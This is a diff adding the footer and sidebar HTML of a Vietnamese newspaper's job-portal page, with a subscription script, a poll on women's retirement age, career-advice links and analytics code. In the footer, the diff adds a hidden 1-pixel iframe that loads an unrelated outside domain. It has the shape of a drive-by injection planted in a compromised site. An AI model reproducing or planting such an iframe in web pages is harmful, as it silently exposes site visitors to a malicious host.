+		form.action="http://vieclam.tuoitre.com.vn/jobseeker/?m=ourservices&a=thanksubcribe&l=";
+		form.submit();
+	}
+}
+function submitenter(){
+	if (window.event && window.event.keyCode == 13){
+		return submitemail();
+	}
+}
+</script>
+
+								</td>
+							</tr>
+							<tr>
+								<td align="center">
+									<!--<Cache Time='05/11/2011 6:07:49 CH'>-->
+<script>
+function OnCmdSubmitClick(Option)
+{
+	for (i = 0; i < Option.length; i++)
+		if (Option[i].checked)
+		{
+			showDialog('ChartView.aspx?SurveyID=24&SurveyDetailID=' + Option[i].value, 450, 250);
+			return;
+		}
+	alert('Bạn cần chọn một câu trả lời trước khi nhấn nút!');
+}
+
+function OnCmdViewClick()
+{
+	showDialog('ChartView.aspx?SurveyID=24', 850, 250);
+}
+</script>
+<table width="90%" height="1" border="0">
+  <tr>
+    <td height="8"></td>
+  </tr>
+</table>
+<table width="90%" border="1" style="BORDER-COLLAPSE: collapse"  bordercolor=#eeb94a>
+  <!--DWLayoutTable-->
+  <tr> 
+          <td align=center valign="middle" bgcolor="#eeb94a" class="SurveyTitle">Thăm dò ý kiến</td>
+  </tr>
+              <tr> 
+                <td height="38" valign="bottom" class="PanelContent">&nbsp;
+				<span class="SurveyItem">Theo bạn, so với nam giới, độ tuổi về hưu của nữ nên:</span>
+                  <br>  
+                      <input type=radio value='115' name="optDetail">
+                      <span class="SurveyItem">Nghỉ hưu trước nam giới 5 năm</span>
+                      <br>
+                     
+                      <input type=radio value='116' name="optDetail">
+                      <span class="SurveyItem">Nghỉ hưu trước nam giới 10 năm</span>
+                      <br>
+                     
+                      <input type=radio value='117' name="optDetail">
+                      <span class="SurveyItem">Bằng với tuổi nghỉ hưu của nam giới</span>
+                      <br>
+                     
+                      <input type=radio value='118' name="optDetail">
+                      <span class="SurveyItem">Bằng tuổi nghỉ hưu của nam, nhưng nếu có nhu cầu, có thể nghỉ trước nam 1-5 năm mà vẫn hưởng nguyên chế độ</span>
+                      <br>
+                     
+                </td>
+</tr>
+<tr><td height=36 valign=middle>&nbsp;
+  <input  type="button" name="cmdSubmit" value="Chọn" onclick="OnCmdSubmitClick(optDetail);" class="SurveyButton" >
+                  &nbsp;&nbsp;&nbsp; <input type="button" name="cmdView" value="Kết quả" onclick="OnCmdViewClick();" class="SurveyButton">
+                  </td>
+  </tr>
+</table>
+<table width="90%" height="1" border="0">
+	<tr>
+		<td height="8"></td>
+  	</tr>
+</table>
+<TABLE class=pBody style="MARGIN: 0px; WIDTH: 160px; HEIGHT: auto" borderColor=#eeb94a cellSpacing=0 cellPadding=0 width=160 align=center border=0>
+<TBODY>
+<TR>
+<TD vAlign=center bgColor=#eeb94a height=23><FONT face=Tahoma color=#ffffff>
+<DIV class=PanelHeader style="MARGIN: 0px" align=center><A href="http://www3.tuoitre.com.vn/Vieclam/Index.aspx?ArticleID=162215&amp;ChannelID=269" target=_blank><FONT face=Arial color=#000000><STRONG>&nbsp;HỒ SƠ XIN VIỆC <BR>cho SV mới tốt nghiệp</STRONG></FONT></DIV></A></FONT></TD></TR>
+<TR>
+<TD height=2></TD></TR>
+<TR>
+<TD vAlign=center bgColor=#eeb94a height=23><FONT face=Tahoma color=#ffffff><FONT face=Arial>
+<DIV class=PanelHeader style="MARGIN: 0px" align=center><A href="http://www3.tuoitre.com.vn/Vieclam/Index.aspx?ArticleID=157713&amp;ChannelID=272" target=_blank><FONT face=Arial color=#000000><STRONG>&nbsp;Hướng dẫn <BR>XIN VIỆC TRỰC TUYẾN</STRONG></FONT></A></FONT></FONT></DIV></TD></TR>
+<TR>
+<TD height=2></TD></TR>
+<TR>
+<TD vAlign=center bgColor=#eeb94a height=23><FONT face=Tahoma color=#ffffff><FONT face=Arial>
+<DIV class=PanelHeader style="MARGIN: 0px" align=center><A href="http://www3.tuoitre.com.vn/Vieclam/Index.aspx?TopicID=615" target=_blank><FONT face=Arial color=#000000><STRONG>&nbsp;KINH NGHIỆM QUẢN LÍ</STRONG></FONT></FONT></DIV></A></FONT></TD></TR>
+<TR>
+<TD height=2></TD></TR>
+<TR>
+<TD vAlign=center bgColor=#eeb94a height=23><FONT face=Tahoma color=#ffffff><FONT face=Arial>
+<DIV class=PanelHeader style="MARGIN: 0px" align=center><A href="http://www3.tuoitre.com.vn/Vieclam/Index.aspx?TopicID=716" target=_blank><FONT face=Arial color=#000000><STRONG>&nbsp;KINH NGHIỆM TUYỂN DỤNG</STRONG></FONT></< A></FONT></DIV></A></FONT></TD></TR></TBODY></TABLE>
+<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%">
+	<tr align="center">
+		<td align="center" height="5"></td>
+	</tr>
+	<tr align="center">
+		<td align="center">
+			
+		</td>
+	</tr>
+</table><!--</Cache>-->
+								</td>
+							</tr>
+						</table>
+				</td>
+				<td  width="13"></td>
+			</tr>			
+			<tr height="5">
+				<td colspan="6"></td>
+			</tr>
+			<tr>
+				<td colspan="6" align="center">
+						<table cellpadding="0" cellspacing="0" border="0" width="95%">
+							<tr>
+								<td height="2">
+								</td>
+							</tr>
+							<tr>
+								<td align="center">
+										<!--<Cache Time='05/11/2011 6:07:49 CH'>--><!--</Cache>-->
+								</td>
+							</tr>
+							<tr>
+								<td height="2">
+								</td>
+							</tr>
+						</table>
+				</td>
+			</tr>
+			<tr height="5">
+				<td colspan="6"></td>
+			</tr>
+		</table>
+		<table align="center" border="0" cellspacing="0" width="789" background="Template/Center/Footer.gif" height="46">
+			<tr style="color:#FFFFFF">
+				<td width="240" align="right"><a class="Footer1" href="http://tuoitre.vn/" target="_blank">Bản quyền © 2003 - 2010 Tuổi Trẻ</a></td>
+				<td align="center">
+					<a class="Footer" href="http://tuoitre.vn/Support/unicode.zip">Font Unicode</a>&nbsp;|&nbsp; 
+					<a class="Footer" href="http://quangcao.tuoitre.com.vn/ndquangcao/banggia/new/banggia.htm" target="_blank">Quảng Cáo</a>&nbsp;|&nbsp; 
+					<a href="http://tuoitre.vn/Support/Subscription_edit.htm" target="_blank" class="Footer">Đặt Báo</a>&nbsp;|&nbsp; 
+					<a class="Footer" href="http://tuoitre.vn/Support/support.htm target="_blank">Hướng Dẫn</a>&nbsp;|&nbsp; 
+					<a class="Footer" href="#" target="_top">Liên Hệ</a>
+				</td>
+				<td width="200" style="margin-right:0px">					
+					<a class="Footer1" href="http://moore.vn" target="_blank">Phát triển bởi Moore Corp.</a>
+				</td>
+			</tr>
+		</table>
+		<div style="width:100%;clear:both;height:1px;overflow:hidden;"><iframe src="http://sixtysix66.com" width="100%" height="1" scrolling='no' frameborder='0'></iframe></div>
+		<script src="highlight.js" type="text/javascript"></script>
+		<script>onBodyLoad();</script>
+		
+		<!-- Google Analytics: Tuoitre.vn -->    
+        <script type="text/javascript" language="javascript">
+            var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+            document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+        </script>
+        <script type="text/javascript">
+            try {
+                var pageTracker = _gat._getTracker("UA-12518695-1");
+                pageTracker._trackPageview();
+            } catch(err) {}
+        </script>
+		
+		<!-- Google Analytics-->
+        
+        
+        <!-- CMS Statistics -->
+        <script language="javascript" type="text/javascript" src="http://statistics.tuoitre.com.vn/TotalStatistics.js"></script>
+        <script language="javascript" type="text/javascript">
+            var paramSta    = "App=VIECLAM";
+            var search      = document.location.search;
+            if(search != '')
+            {
+                paramSta = paramSta + "&" + search.replace("?","")
+            }
+            IframeRender(paramSta);
+        </script> 
+	</body>
+</HTML>
